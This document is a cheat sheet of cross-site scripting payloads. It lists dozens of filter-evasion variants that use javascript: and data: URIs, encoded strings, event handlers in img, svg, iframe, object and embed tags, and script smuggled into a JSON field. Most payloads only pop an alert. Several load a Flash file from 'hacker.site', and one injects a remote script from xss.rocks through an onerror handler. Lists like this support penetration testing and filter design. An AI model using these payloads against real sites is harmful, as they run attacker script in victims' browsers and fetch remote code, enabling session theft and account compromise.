<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />

javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
javascript:alert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==

<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">

&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>

//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />

;`${alert(1)}``${`${`${`${alert(1)}`}`}`}`
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>alert(1)</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>alert(1)</iframe>">

<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)


json file
{"name":"</script><script>alert('XSS')</script>"}








